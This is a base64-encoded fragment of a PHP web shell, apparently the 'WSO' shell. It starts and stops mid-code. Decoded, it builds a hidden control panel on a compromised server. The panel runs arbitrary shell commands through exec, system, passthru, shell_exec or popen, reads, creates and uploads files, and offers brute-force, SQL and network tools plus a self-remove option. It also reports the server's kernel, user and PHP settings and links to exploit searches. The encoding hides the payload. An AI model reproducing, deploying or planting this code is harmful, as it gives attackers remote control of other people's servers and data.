fQoudG9vbHNJbnB7IHdpZHRoOiAzMDBweCB9Ci5tYWluIHRoe3RleHQtYWxpZ246bGVmdDtiYWNrZ3JvdW5kLWNvbG9yOiM1ZTVlNWU7fQoubWFpbiB0cjpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiM1ZTVlNWV9Ci5sMXtiYWNrZ3JvdW5kLWNvbG9yOiM0NDR9Ci5sMntiYWNrZ3JvdW5kLWNvbG9yOiMzMzN9CnByZXtmb250LWZhbWlseTpDb3VyaWVyLE1vbm9zcGFjZTt9Cjwvc3R5bGU+CjxzY3JpcHQ+CiAgICB2YXIgY18gPSAnIiAuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuICInOwogICAgdmFyIGFfID0gJyIgLiBodG1sc3BlY2lhbGNoYXJzKEAkX1BPU1RbJ2EnXSkgLiInCiAgICB2YXIgY2hhcnNldF8gPSAnIiAuIGh0bWxzcGVjaWFsY2hhcnMoQCRfUE9TVFsnY2hhcnNldCddKSAuIic7CiAgICB2YXIgcDFfID0gJyIgLiAoKHN0cnBvcyhAJF9QT1NUWydwMSddLCJcbiIpIT09ZmFsc2UpPycnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMSddLEVOVF9RVU9URVMpKSAuIic7CiAgICB2YXIgcDJfID0gJyIgLiAoKHN0cnBvcyhAJF9QT1NUWydwMiddLCJcbiIpIT09ZmFsc2UpPycnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMiddLEVOVF9RVU9URVMpKSAuIic7CiAgICB2YXIgcDNfID0gJyIgLiAoKHN0cnBvcyhAJF9QT1NUWydwMyddLCJcbiIpIT09ZmFsc2UpPycnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMyddLEVOVF9RVU9URVMpKSAuIic7CiAgICB2YXIgZCA9IGRvY3VtZW50OwoJZnVuY3Rpb24gc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KSB7CgkJaWYoYSE9bnVsbClkLm1mLmEudmFsdWU9YTtlbHNlIGQubWYuYS52YWx1ZT1hXzsKCQlpZihjIT1udWxsKWQubWYuYy52YWx1ZT1jO2Vsc2UgZC5tZi5jLnZhbHVlPWNfOwoJCWlmKHAxIT1udWxsKWQubWYucDEudmFsdWU9cDE7ZWxzZSBkLm1mLnAxLnZhbHVlPXAxXzsKCQlpZihwMiE9bnVsbClkLm1mLnAyLnZhbHVlPXAyO2Vsc2UgZC5tZi5wMi52YWx1ZT1wMl87CgkJaWYocDMhPW51bGwpZC5tZi5wMy52YWx1ZT1wMztlbHNlIGQubWYucDMudmFsdWU9cDNfOwoJCWlmKGNoYXJzZXQhPW51bGwpZC5tZi5jaGFyc2V0LnZhbHVlPWNoYXJzZXQ7ZWxzZSBkLm1mLmNoYXJzZXQudmFsdWU9Y2hhcnNldF87Cgl9CglmdW5jdGlvbiBnKGEsYyxwMSxwMixwMyxjaGFyc2V0KSB7CgkJc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KTsKCQlkLm1mLnN1Ym1pdCgpOwoJfQoJZnVuY3Rpb24gYShhLGMscDEscDIscDMsY2hhcnNldCkgewoJCXNldChhLGMscDEscDIscDMsY2hhcnNldCk7CgkJdmFyIHBhcmFtcyA9ICdhamF4PXRydWUnOwoJCWZvcihpPTA7aTxkLm1mLmVsZW1lbnRzLmxlbmd0aDtpKyspCgkJCXBhcmFtcyArPSAnJicrZC5tZi5lbGVtZW50c1tpXS5uYW1lKyc9JytlbmNvZGVVUklDb21wb25lbnQoZC5tZi5lbGVtZW50c1tpXS52YWx1ZSk7CgkJc3IoJyIgLiBhZGRzbGFzaGVzKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSAuIicsIHBhcmFtcyk7Cgl9CglmdW5jdGlvbiBzcih1cmwsIHBhcmFtcykgewoJCWlmICh3aW5kb3cuWE1MSHR0cFJlcXVlc3QpCgkJCXJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwoJCWVsc2UgaWYgKHdpbmRvdy5BY3RpdmVYT2JqZWN0KQoJCQlyZXEgPSBuZXcgQWN0aXZlWE9iamVjdCgnTWljcm9zb2Z0LlhNTEhUVFAnKTsKICAgICAgICBpZiAocmVxKSB7CiAgICAgICAgICAgIHJlcS5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBwcm9jZXNzUmVxQ2hhbmdlOwogICAgICAgICAgICByZXEub3BlbignUE9TVCcsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgIHJlcS5zZXRSZXF1ZXN0SGVhZGVyICgnQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOwogICAgICAgICAgICByZXEuc2VuZChwYXJhbXMpOwogICAgICAgIH0KCX0KCWZ1bmN0aW9uIHByb2Nlc3NSZXFDaGFuZ2UoKSB7CgkJaWYoIChyZXEucmVhZHlTdGF0ZSA9PSA0KSApCgkJCWlmKHJlcS5zdGF0dXMgPT0gMjAwKSB7CgkJCQl2YXIgcmVnID0gbmV3IFJlZ0V4cChcIihcXFxcZCspKFtcXFxcU1xcXFxzXSopXCIsICdtJyk7CgkJCQl2YXIgYXJyPXJlZy5leGVjKHJlcS5yZXNwb25zZVRleHQpOwoJCQkJZXZhbChhcnJbMl0uc3Vic3RyKDAsIGFyclsxXSkpOwoJCQl9IGVsc2UgYWxlcnQoJ1JlcXVlc3QgZXJyb3IhJyk7Cgl9Cjwvc2NyaXB0Pgo8aGVhZD48Ym9keT48ZGl2IHN0eWxlPSdwb3NpdGlvbjphYnNvbHV0ZTt3aWR0aDoxMDAlO2JhY2tncm91bmQtY29sb3I6IzQ0NDt0b3A6MDtsZWZ0OjA7Jz4KPGZvcm0gbWV0aG9kPXBvc3QgbmFtZT1tZiBzdHlsZT0nZGlzcGxheTpub25lOyc+CjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWE+CjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWM+CjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAxPgo8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMj4KPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9cDM+CjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNoYXJzZXQ+CjwvZm9ybT4iOwoJJGZyZWVTcGFjZSA9IEBkaXNrZnJlZXNwYWNlKCRHTE9CQUxTWydjd2QnXSk7CgkkdG90YWxTcGFjZSA9IEBkaXNrX3RvdGFsX3NwYWNlKCRHTE9CQUxTWydjd2QnXSk7CgkkdG90YWxTcGFjZSA9ICR0b3RhbFNwYWNlPyR0b3RhbFNwYWNlOjE7CgkkcmVsZWFzZSA9IEBwaHBfdW5hbWUoJ3InKTsKCSRrZXJuZWwgPSBAcGhwX3VuYW1lKCdzJyk7CgkkZXhwbGluayA9ICdodHRwOi8vZXhwbG9pdC1kYi5jb20vc2VhcmNoLz9hY3Rpb249c2VhcmNoJmZpbHRlcl9kZXNjcmlwdGlvbj0nOwoJaWYoc3RycG9zKCdMaW51eCcsICRrZXJuZWwpICE9PSBmYWxzZSkKCQkkZXhwbGluayAuPSB1cmxlbmNvZGUoJ0xpbnV4IEtlcm5lbCAnIC4gc3Vic3RyKCRyZWxlYXNlLDAsNikpOwoJZWxzZQoJCSRleHBsaW5rIC49IHVybGVuY29kZSgka2VybmVsIC4gJyAnIC4gc3Vic3RyKCRyZWxlYXNlLDAsMykpOwoJaWYoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKSB7CgkJJHVzZXIgPSBAZ2V0X2N1cnJlbnRfdXNlcigpOwoJCSR1aWQgPSBAZ2V0bXl1aWQoKTsKCQkkZ2lkID0gQGdldG15Z2lkKCk7CgkJJGdyb3VwID0gIj8iOwoJfSBlbHNlIHsKCQkkdWlkID0gQHBvc2l4X2dldHB3dWlkKHBvc2l4X2dldGV1aWQoKSk7CgkJJGdpZCA9IEBwb3NpeF9nZXRncmdpZChwb3NpeF9nZXRlZ2lkKCkpOwoJCSR1c2VyID0gJHVpZFsnbmFtZSddOwoJCSR1aWQgPSAkdWlkWyd1aWQnXTsKCQkkZ3JvdXAgPSAkZ2lkWyduYW1lJ107CgkJJGdpZCA9ICRnaWRbJ2dpZCddOwoJfQoKCSRjd2RfbGlua3MgPSAnJzsKCSRwYXRoID0gZXhwbG9kZSgiLyIsICRHTE9CQUxTWydjd2QnXSk7Cgkkbj1jb3VudCgkcGF0aCk7Cglmb3IoJGk9MDsgJGk8JG4tMTsgJGkrKykgewoJCSRjd2RfbGlua3MgLj0gIjxhIGhyZWY9JyMnIG9uY2xpY2s9J2coXCJGaWxlc01hblwiLFwiIjsKCQlmb3IoJGo9MDsgJGo8PSRpOyAkaisrKQoJCQkkY3dkX2xpbmtzIC49ICRwYXRoWyRqXS4nLyc7CgkJJGN3ZF9saW5rcyAuPSAiXCIpJz4iLiRwYXRoWyRpXS4iLzwvYT4iOwoJfQoKCSRjaGFyc2V0cyA9IGFycmF5KCdVVEYtOCcsICdXaW5kb3dzLTEyNTEnLCAnS09JOC1SJywgJ0tPSTgtVScsICdjcDg2NicpOwoJJG9wdF9jaGFyc2V0cyA9ICcnOwoJZm9yZWFjaCgkY2hhcnNldHMgYXMgJGl0ZW0pCgkJJG9wdF9jaGFyc2V0cyAuPSAnPG9wdGlvbiB2YWx1ZT0iJy4kaXRlbS4nIiAnLigkX1BPU1RbJ2NoYXJzZXQnXT09JGl0ZW0/J3NlbGVjdGVkJzonJykuJz4nLiRpdGVtLic8L29wdGlvbj4nOwoKCSRtID0gYXJyYXkoJ1NlYy4gSW5mbyc9PidTZWNJbmZvJywnRmlsZXMnPT4nRmlsZXNNYW4nLCdDb25zb2xlJz0+J0NvbnNvbGUnLCdTcWwnPT4nU3FsJywnUGhwJz0+J1BocCcsJ1N0cmluZyB0b29scyc9PidTdHJpbmdUb29scycsJ0JydXRlZm9yY2UnPT4nQnJ1dGVmb3JjZScsJ05ldHdvcmsnPT4nTmV0d29yaycpOwoJaWYoIWVtcHR5KCRHTE9CQUxTWydhdXRoX3Bhc3MnXSkpCgkJJG1bJ0xvZ291dCddID0gJ0xvZ291dCc7CgkkbVsnU2VsZiByZW1vdmUnXSA9ICdTZWxmUmVtb3ZlJzsKCSRtZW51ID0gJyc7Cglmb3JlYWNoKCRtIGFzICRrID0+ICR2KQoJCSRtZW51IC49ICc8dGggd2lkdGg9IicuKGludCkoMTAwL2NvdW50KCRtKSkuJyUiPlsgPGEgaHJlZj0iIyIgb25jbGljaz0iZyhcJycuJHYuJ1wnLG51bGwsXCdcJyxcJ1wnLFwnXCcpIj4nLiRrLic8L2E+IF08L3RoPic7CgoJJGRyaXZlcyA9ICIiOwoJaWYoJEdMT0JBTFNbJ29zJ10gPT0gJ3dpbicpIHsKCQlmb3JlYWNoKHJhbmdlKCdjJywneicpIGFzICRkcml2ZSkKCQlpZihpc19kaXIoJGRyaXZlLic6XFwnKSkKCQkJJGRyaXZlcyAuPSAnPGEgaHJlZj0iIyIgb25jbGljaz0iZyhcJ0ZpbGVzTWFuXCcsXCcnLiRkcml2ZS4nOi9cJykiPlsgJy4kZHJpdmUuJyBdPC9hPiAnOwoJfQoJZWNobyAnPHRhYmxlIGNsYXNzPWluZm8gY2VsbHBhZGRpbmc9MyBjZWxsc3BhY2luZz0wIHdpZHRoPTEwMCU+PHRyPjx0ZCB3aWR0aD0xPjxzcGFuPlVuYW1lOjxicj5Vc2VyOjxicj5QaHA6PGJyPkhkZDo8YnI+Q3dkOicgLiAoJEdMT0JBTFNbJ29zJ10gPT0gJ3dpbic/Jzxicj5Ecml2ZXM6JzonJykgLiAnPC9zcGFuPjwvdGQ+JwogICAgICAgLiAnPHRkPjxub2JyPicgLiBzdWJzdHIoQHBocF91bmFtZSgpLCAwLCAxMjApIC4gJyA8YSBocmVmPSInIC4gJGV4cGxpbmsgLiAnIiB0YXJnZXQ9X2JsYW5rPltleHBsb2l0LWRiLmNvbV08L2E+PC9ub2JyPjxicj4nIC4gJHVpZCAuICcgKCAnIC4gJHVzZXIgLiAnICkgPHNwYW4+R3JvdXA6PC9zcGFuPiAnIC4gJGdpZCAuICcgKCAnIC4gJGdyb3VwIC4gJyApPGJyPicgLiBAcGhwdmVyc2lvbigpIC4gJyA8c3Bhbj5TYWZlIG1vZGU6PC9zcGFuPiAnIC4gKCRHTE9CQUxTWydzYWZlX21vZGUnXT8nPGZvbnQgY29sb3I9cmVkPk9OPC9mb250Pic6Jzxmb250IGNvbG9yPWdyZWVuPjxiPk9GRjwvYj48L2ZvbnQ+JykKICAgICAgIC4gJyA8YSBocmVmPSMgb25jbGljaz0iZyhcJ1BocFwnLG51bGwsXCdcJyxcJ2luZm9cJykiPlsgcGhwaW5mbyBdPC9hPiA8c3Bhbj5EYXRldGltZTo8L3NwYW4+ICcgLiBkYXRlKCdZLW0tZCBIOmk6cycpIC4gJzxicj4nIC4gd3NvVmlld1NpemUoJHRvdGFsU3BhY2UpIC4gJyA8c3Bhbj5GcmVlOjwvc3Bhbj4gJyAuIHdzb1ZpZXdTaXplKCRmcmVlU3BhY2UpIC4gJyAoJy4gKGludCkgKCRmcmVlU3BhY2UvJHRvdGFsU3BhY2UqMTAwKSAuICclKTxicj4nIC4gJGN3ZF9saW5rcyAuICcgJy4gd3NvUGVybXNDb2xvcigkR0xPQkFMU1snY3dkJ10pIC4gJyA8YSBocmVmPSMgb25jbGljaz0iZyhcJ0ZpbGVzTWFuXCcsXCcnIC4gJEdMT0JBTFNbJ2hvbWVfY3dkJ10gLiAnXCcsXCdcJyxcJ1wnLFwnXCcpIj5bIGhvbWUgXTwvYT48YnI+JyAuICRkcml2ZXMgLiAnPC90ZD4nCiAgICAgICAuICc8dGQgd2lkdGg9MSBhbGlnbj1yaWdodD48bm9icj48c2VsZWN0IG9uY2hhbmdlPSJnKG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCx0aGlzLnZhbHVlKSI+PG9wdGdyb3VwIGxhYmVsPSJQYWdlIGNoYXJzZXQiPicgLiAkb3B0X2NoYXJzZXRzIC4gJzwvb3B0Z3JvdXA+PC9zZWxlY3Q+PGJyPjxzcGFuPlNlcnZlciBJUDo8L3NwYW4+PGJyPicgLiBAJF9TRVJWRVJbIlNFUlZFUl9BRERSIl0gLiAnPGJyPjxzcGFuPkNsaWVudCBJUDo8L3NwYW4+PGJyPicgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICc8L25vYnI+PC90ZD48L3RyPjwvdGFibGU+JwogICAgICAgLiAnPHRhYmxlIHN0eWxlPSJib3JkZXItdG9wOjJweCBzb2xpZCAjMzMzOyIgY2VsbHBhZGRpbmc9MyBjZWxsc3BhY2luZz0wIHdpZHRoPTEwMCU+PHRyPicgLiAkbWVudSAuICc8L3RyPjwvdGFibGU+PGRpdiBzdHlsZT0ibWFyZ2luOjUiPic7Cn0KCmZ1bmN0aW9uIHdzb0Zvb3RlcigpIHsKCSRpc193cml0YWJsZSA9IGlzX3dyaXRhYmxlKCRHTE9CQUxTWydjd2QnXSk/IiA8Zm9udCBjb2xvcj0nZ3JlZW4nPihXcml0ZWFibGUpPC9mb250PiI6IiA8Zm9udCBjb2xvcj1yZWQ+KE5vdCB3cml0YWJsZSk8L2ZvbnQ+IjsKICAgIGVjaG8gIgo8L2Rpdj4KPHRhYmxlIGNsYXNzPWluZm8gaWQ9dG9vbHNUYmwgY2VsbHBhZGRpbmc9MyBjZWxsc3BhY2luZz0wIHdpZHRoPTEwMCUgIHN0eWxlPSdib3JkZXItdG9wOjJweCBzb2xpZCAjMzMzO2JvcmRlci1ib3R0b206MnB4IHNvbGlkICMzMzM7Jz4KCTx0cj4KCQk8dGQ+PGZvcm0gb25zdWJtaXQ9J2cobnVsbCx0aGlzLmMudmFsdWUsXCJcIik7cmV0dXJuIGZhbHNlOyc+PHNwYW4+Q2hhbmdlIGRpcjo8L3NwYW4+PGJyPjxpbnB1dCBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9dGV4dCBuYW1lPWMgdmFsdWU9JyIgLiBodG1sc3BlY2lhbGNoYXJzKCRHTE9CQUxTWydjd2QnXSkgLiInPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nPj4nPjwvZm9ybT48L3RkPgoJCTx0ZD48Zm9ybSBvbnN1Ym1pdD1cImcoJ0ZpbGVzVG9vbHMnLG51bGwsdGhpcy5mLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCI+PHNwYW4+UmVhZCBmaWxlOjwvc3Bhbj48YnI+PGlucHV0IGNsYXNzPSd0b29sc0lucCcgdHlwZT10ZXh0IG5hbWU9Zj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Jz4+Jz48L2Zvcm0+PC90ZD4KCTwvdHI+PHRyPgoJCTx0ZD48Zm9ybSBvbnN1Ym1pdD1cImcoJ0ZpbGVzTWFuJyxudWxsLCdta2RpcicsdGhpcy5kLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCI+PHNwYW4+TWFrZSBkaXI6PC9zcGFuPiRpc193cml0YWJsZTxicj48aW5wdXQgY2xhc3M9J3Rvb2xzSW5wJyB0eXBlPXRleHQgbmFtZT1kPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nPj4nPjwvZm9ybT48L3RkPgoJCTx0ZD48Zm9ybSBvbnN1Ym1pdD1cImcoJ0ZpbGVzVG9vbHMnLG51bGwsdGhpcy5mLnZhbHVlLCdta2ZpbGUnKTtyZXR1cm4gZmFsc2U7XCI+PHNwYW4+TWFrZSBmaWxlOjwvc3Bhbj4kaXNfd3JpdGFibGU8YnI+PGlucHV0IGNsYXNzPSd0b29sc0lucCcgdHlwZT10ZXh0IG5hbWU9Zj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Jz4+Jz48L2Zvcm0+PC90ZD4KCTwvdHI+PHRyPgoJCTx0ZD48Zm9ybSBvbnN1Ym1pdD1cImcoJ0NvbnNvbGUnLG51bGwsdGhpcy5jLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCI+PHNwYW4+RXhlY3V0ZTo8L3NwYW4+PGJyPjxpbnB1dCBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9dGV4dCBuYW1lPWMgdmFsdWU9Jyc+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPjwvdGQ+CgkJPHRkPjxmb3JtIG1ldGhvZD0ncG9zdCcgRU5DVFlQRT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+CgkJPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nRmlsZXNNQW4nPgoJCTxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9JyIgLiAkR0xPQkFMU1snY3dkJ10gLiInPgoJCTxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAxIHZhbHVlPSd1cGxvYWRGaWxlJz4KCQk8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1jaGFyc2V0IHZhbHVlPSciIC4gKGlzc2V0KCRfUE9TVFsnY2hhcnNldCddKT8kX1BPU1RbJ2NoYXJzZXQnXTonJykgLiAiJz4KCQk8c3Bhbj5VcGxvYWQgZmlsZTo8L3NwYW4+JGlzX3dyaXRhYmxlPGJyPjxpbnB1dCBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPjxiciAgPjwvdGQ+Cgk8L3RyPjwvdGFibGU+PC9kaXY+PC9ib2R5PjwvaHRtbD4iOwp9CgppZiAoIWZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0cHd1aWQiKSAmJiAoc3RycG9zKCRHTE9CQUxTWydkaXNhYmxlX2Z1bmN0aW9ucyddLCAncG9zaXhfZ2V0cHd1aWQnKT09PWZhbHNlKSkgewogICAgZnVuY3Rpb24gcG9zaXhfZ2V0cHd1aWQoJHApIHtyZXR1cm4gZmFsc2U7fSB9CmlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRncmdpZCIpICYmIChzdHJwb3MoJEdMT0JBTFNbJ2Rpc2FibGVfZnVuY3Rpb25zJ10sICdwb3NpeF9nZXRncmdpZCcpPT09ZmFsc2UpKSB7CiAgICBmdW5jdGlvbiBwb3NpeF9nZXRncmdpZCgkcCkge3JldHVybiBmYWxzZTt9IH0KCmZ1bmN0aW9uIHdzb0V4KCRpbikgewoJJG91dCA9ICcnOwoJaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7CgkJQGV4ZWMoJGluLCRvdXQpOwoJCSRvdXQgPSBAam9pbigiXG4iLCRvdXQpOwoJfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSkgewoJCW9iX3N0YXJ0KCk7CgkJQHBhc3N0aHJ1KCRpbik7CgkJJG91dCA9IG9iX2dldF9jbGVhbigpOwoJfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpIHsKCQlvYl9zdGFydCgpOwoJCUBzeXN0ZW0oJGluKTsKCQkkb3V0ID0gb2JfZ2V0X2NsZWFuKCk7Cgl9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpIHsKCQkkb3V0ID0gc2hlbGxfZXhlYygkaW4pOwoJfSBlbHNlaWYgKGlzX3Jlc291cmNlKCRmID0gQHBvcGVuKCRpbiwiciIpKSkgewoJCSRvdXQgPSAiIjsKCQl3aGlsZSghQGZlb2YoJGYpKQoJCQkkb3V0IC49IGZyZWFkKCRmLDEwMjQpOwoJCXBjbG9zZSgkZik7Cgl9CglyZXR1cm4gJG91dDsKfQoKZnVuY3Rpb24gd3NvVmlld1NpemUoJHMpIHsKICAgIGlmIChpc19pbnQoJHMpKQogICAgICAgICRzID0gc3ByaW50ZigiJXUiLCAkcyk7CgoJaWYoJHMgPj0gMTA3Mzc0MTgyNCkKCQlyZXR1cm4gc3ByaW50ZignJTEuMmYnLCAkcyAvIDEwNzM3NDE4MjQgKS4gJyBHQic7CgllbHNlaWYoJHMgPj0gMTA0ODU3NikKCQlyZXR1cm4gc3ByaW50ZignJTEuMmYnLCAkcyAvIDEwNDg1NzYgKSAuICcgTUInOwoJZWxzZWlmKCRzID49IDEwMjQpCgkJcmV0dXJuIHNwcmludGYoJyUxLjJmJywgJHMgLyAxMDI0ICkgLiAnIEtCJzsKCWVsc2UKCQlyZXR1cm4gJHMgLiAnIEInOwp9CgpmdW5jdGlvbiB3c29QZXJtcygkcCkgewoJaWYgKCgkcCAmIDB4QzAwMCkgPT0gMHhDMDAwKSRpID0gJ3MnOwoJZWxzZWlmICgoJHAgJiAweEEwMDApID09IDB4QTAwMCkkaSA9ICdsJzsKCWVsc2VpZiAoKCRwICYgMHg4MDAwKSA9PSAweDgwMDApJGkgPSAnLSc7CgllbHNlaWYgKCgkcCAmIDB4NjAwMCkgPT0gMHg2MDAwKSRpID0gJ2InOwoJZWxzZWlmICgoJHAgJiAweDQwMDApID09IDB4NDAwMCkkaSA9ICdkJzsKCWVsc2VpZiAoKCRwICYgMHgyMDAwKSA9PSAweDIwMDApJGkgPSAnYyc7CgllbHNlaWYgKCgkcCAmIDB4MTAwMCkgPT0gMHgxMDAwKSRpID0gJ3AnOwoJZWxzZSAkaSA9ICd1JzsKCSRpIC49ICgoJHAgJiAweDAxMDApID8gJ3InIDogJy0nKTsKCSRpIC49ICgoJHAgJiAweDAwODApID8gJ3cnIDogJy0nKTsKCSRpIC49ICgoJHAgJiAweDAwNDApID8gKCgkcCAmIDB4MDgwMCkgPyAncycgOiAneCcgKSA6ICgoJHAgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CgkkaSAuPSAoKCRwICYgMHgwMDIwKSA/ICdyJyA6ICctJyk7CgkkaSAuPSAoKCRwICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7CgkkaSAuPSAoKCRwICYgMHgwMDA4KSA/ICgoJHAgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOiAoKCRwICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwoJJGkgLj0gKCgkcCAmIDB4MDAwNCkgPyAncicgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAwMikgPyAndycgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAwMSkgPyAoKCRwICYgMHgwMjAwKSA/ICd0JyA6ICd4JyApIDogKCgkcCAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsKCXJldHVybiAkaTsKfQoKZnVuY3Rpb24gd3NvUGVybXNDb2xvcigkZikgewoJaWYgKCFAaXNfcmVhZGFibGUoJGYpKQoJCXJldHVybiAnPGZvbnQgY29sb3I9I0ZGMDAwMD4nIC4gd3NvUGVybXMoQGZpbGVwZXJtcygkZikpIC4gJzwvZm9udD4nOwoJZWxzZWlmICghQGlzX3dyaXRhYmxlKCRmKSkKCQlyZXR1cm4gJzxmb250IGNvbG9yPXdoaXRlPicgLiB3c29QZXJtcyhAZmlsZXBlcm1zKCRmKSkgLiAnPC9mb250Pic7CgllbHNlCgkJcmV0dXJuICc8Zm9udCBjb2xvcj0jMjVmZjAwPicgLiB3c29QZXJtcyhAZmlsZXBlcm1zKCRmKSkgLiAnPC9mb250Pic7Cn0KCmZ1bmN0aW9uIHdzb1NjYW5kaXIoJGRpcikgewogICAgaWYoZnVuY3Rpb25fZXhpc3RzKCJzY2FuZGlyIikpIHsKICAgICAgICByZXR1cm4gc2NhbmRpcigkZGlyKTsKICAgIH0gZWxzZSB7CiAgICAgICAgJGRoICA9IG9wZW5kaXIoJGRpcik7CiAgICAgICAgd2hpbGUgKGZhbHNlICE9PSAoJGZpbGVuYW1lID0gcmVhZGRpcigkZGgpKSkKICAgICAgICAgICAgJGZpbGVzW10gPSAkZmlsZW5hbWU7CiAgICAgICAgcmV0dXJuICRmaWxlczsKICAgIH0KfQoKZnVuY3Rpb24gd3NvV2hpY2goJHApIHsKCSRwYXRoID0gd3NvRXgoJ3doaWNoICcgLiAkcCk7CglpZighZW1wdHkoJHBhdGgpKQoJCXJldHVybiAkcGF0aDsKCXJldHVybiBmYWxzZTsKfQoKZnVuY3Rpb24gYWN0aW9uU2VjSW5mbygpIHsKCXdzb0hlYWRlcigpOwoJZWNobyAnPGgxPlNlcnZlciBzZWN1cml0eSBpbmZvcm1hdGlvbjwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CglmdW5jdGlvbiB3c29TZWNQYXJhbSgkbiwgJHYpIHsKCQkkdiA9IHRyaW0oJHYpOwoJCWlmKCR2KSB7CgkJCWVjaG8gJzxzcGFuPicgLiAkbiAuICc6IDwvc3Bhbj4nOwoJCQlpZihzdHJwb3MoJHYsICJcbiIpID09PSBmYWxzZSkKCQkJCWVjaG8gJHYgLiAnPGJyPic7CgkJCWVsc2UKCQkJCWVjaG8gJzxwcmUgY2xhc3M9bWwxPicgLiAkdiAuICc8L3ByZT4nOwoJCX0KCX0KCgl3c29TZWNQYXJhbSgnU2VydmVyIHNvZnR3YXJlJywgQGdldGVudignU0VSVkVSX1NPRlRXQVJFJykpOwogICAgaWYoZnVuY3Rpb25fZXhpc3RzKCdhcGFjaGVfZ2V0X21vZHVsZXMnKSkKICAgICAgICB3c29TZWNQYXJhbSgnTG9hZGVkIEFwYWNoZSBtb2R1bGVzJywgaW1wbG9kZSgnLCAnLCBhcGFjaGVfZ2V0X21vZHVsZXMoKSkpOwoJd3NvU2VjUGFyYW0oJ0Rpc2FibGVkIFBIUCBGdW5jdGlvbnMnLCAkR0xPQkFMU1snZGlzYWJsZV9mdW5jdGlvbnMnXT8kR0xPQkFMU1snZGlzYWJsZV9mdW5jdGlvbnMnXTonbm9uZScpOwoJd3NvU2VjUGFyYW0oJ09wZW4gYmFzZSBkaXInLCBAaW5pX2dldCgnb3Blbl9iYXNlZGlyJykpOwoJd3NvU2VjUGFyYW0oJ1NhZmUgbW9kZSBleGVjIGRpcicsIEBpbmlfZ2V0KCdzYWZlX21vZGVfZXhlY19kaXInKSk7Cgl3c29TZWNQYXJhbSgnU2FmZSBtb2RlIGluY2x1ZGUgZGlyJywgQGluaV9nZXQoJ3NhZmVfbW9kZV9pbmNsdWRlX2RpcicpKTsKCXdzb1NlY1BhcmFtKCdjVVJMIHN1cHBvcnQnLCBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpPydlbmFibGVkJzonbm8nKTsKCSR0ZW1wPWFycmF5KCk7CglpZihmdW5jdGlvbl9leGlzdHMoJ215c3FsX2dldF9jbGllbnRfaW5mbycpKQoJCSR0ZW1wW10gPSAiTXlTcWwgKCIubXlzcWxfZ2V0X2NsaWVudF9pbmZvKCkuIikiOwoJaWYoZnVuY3Rpb25fZXhpc3RzKCdtc3NxbF9jb25uZWN0JykpCgkJJHRlbXBbXSA9ICJNU1NRTCI7CglpZihmdW5jdGlvbl9leGlzdHMoJ3BnX2Nvbm5lY3QnKSkKCQkkdGVtcFtdID0gIlBvc3RncmVTUUwiOwoJaWYoZnVuY3Rpb25fZXhpc3RzKCdvY2lfY29ubmVjdCcpKQoJCSR0ZW1wW10gPSAiT3JhY2xlIjsKCXdzb1NlY1BhcmFtKCdTdXBwb3J0ZWQgZGF0YWJhc2VzJywgaW1wbG9kZSgnLCAnLCAkdGVtcCkpOwoJZWNobyAnPGJyPic7CgoJaWYoJEdMT0JBTFNbJ29zJ10gPT0gJ25peCcpIHsKICAgICAgICAgICAgd3NvU2VjU